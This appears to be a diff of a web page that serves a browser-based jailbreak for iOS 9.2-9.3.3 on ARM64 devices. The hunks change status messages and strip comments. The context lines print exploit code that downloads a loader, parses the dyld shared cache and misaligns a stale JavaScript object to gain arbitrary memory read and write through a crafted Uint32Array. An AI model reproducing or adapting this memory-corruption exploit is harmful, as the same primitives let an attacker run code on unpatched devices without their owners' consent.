@@ -27,7 +27,7 @@
  req.open('GET', url, false);
  req.overrideMimeType('text\/plain; charset=x-user-defined');
  req.send(null);
- if (req.status != 200) {document.write("failed downloading loader");stop=1};
+ if (req.status != 200) {document.write("Failed downloading the loader.dms...");stop=1};
  return req.responseText;
  }
  
@@ -126,7 +126,7 @@ function smashed(stl) {
             if( smsh[dyncache/4 + i] == 0xd &&
                 smsh[dyncache/4 + i + 1] == 0x40 &&
                 smsh[dyncache/4 + i + 2] == 0x18 &&
-                smsh[dyncache/4 + i + 11] == 0x61707369) // lulziest mach-o parser ever
+                smsh[dyncache/4 + i + 11] == 0x61707369)
             {
                 go = 0;
                 break;
@@ -140,7 +140,7 @@ function smashed(stl) {
  var bss_size = [];
 
  for(i=0; i < 0x1000/4; i++) {
-        if( smsh[dyncache/4 + i] == 0x73625f5f && smsh[dyncache/4 + i + 1] == 0x73) { // lolhax
+        if( smsh[dyncache/4 + i] == 0x73625f5f && smsh[dyncache/4 + i + 1] == 0x73) { 
  bss.push(smsh[dyncache/4 + i + (0x20/4)] + dyncachev-0x80000000);
  bss_size.push(smsh[dyncache/4 + i + (0x28/4)]);
 
@@ -191,7 +191,7 @@ function smashed(stl) {
  
  
  function go() {
- document.body.innerHTML = "<pre><center>Reactivating. Please wait...</body></pre></center>";
+ document.body.innerHTML = "<pre><center>Reactivating jailbroken state... Please wait...</body></pre></center>";
  setTimeout(go_, 100);
  }
  function go_(){
@@ -249,10 +249,10 @@ for (i=0; i < bufs.length; i++) {
         stale[0] = {'a':u2d(105, 0x1172600),'b':u2d(0,0),'c':smsh,'d':u2d(0x100,0)}
         stale[1] = stale[0]
 
-        bufs[i][k] += 0x10; // misalign so we end up in JSObject's properties, which have a crafted Uint32Array pointing to smsh
+        bufs[i][k] += 0x10; 
         bck = stale[0][4];
-        stale[0][4] = 0; // address, low 32 bits
-        // stale[0][5] = 1; // address, high 32 bits == 0x100000000
+        stale[0][4] = 0; 
+        // stale[0][5] = 1; 
         stale[0][6] = 0xffffffff;
 
  mem0 = stale[0];
@@ -266,7 +266,7 @@ for (i=0; i < bufs.length; i++) {
  stale[0][4] = bck;
         stale[0][6] = 0x10;
  
- bufs[i][k] -= 0x10; // FIXUP
+ bufs[i][k] -= 0x10; 
  
  bufs.push(stale[0]);
  bufs.push(stale[0]);
@@ -293,9 +293,9 @@ for (i=0; i < bufs.length; i++) {
 
 <h1></h1>
 
-More device support coming soon.
+More devices and more firmware support coming soon.
 
-Still only supports iOS 9.2-9.3.3 and ARM64-bit.
+Still only supports iOS 9.2-9.3.3 and still only supports ARM64-bit devices.
 
 <a href="javascript:go()">Reactivate Jailbreak</a>
 
